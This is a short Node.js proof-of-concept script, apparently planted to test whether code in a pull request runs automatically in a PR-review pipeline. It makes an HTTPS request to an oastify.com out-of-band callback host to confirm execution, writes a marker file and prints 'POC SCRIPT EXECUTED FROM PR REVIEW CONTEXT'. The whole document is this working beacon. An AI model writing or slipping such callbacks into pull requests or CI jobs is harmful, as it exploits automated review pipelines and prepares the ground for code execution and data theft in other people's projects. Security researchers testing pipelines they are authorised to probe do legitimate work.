const https = require('https');
const fs = require('fs');
https.get('https://hsdvcbolq7nbw4p1y4dg56vhq8wzke1v5gdkzbo.oastify.com/pr-review-autotrigger', (res) => {
    fs.writeFileSync('poc-outcome.txt', 'PR_REVIEW_TRIGGERED_EXECUTION\n');
});
console.log('POC SCRIPT EXECUTED FROM PR REVIEW CONTEXT');
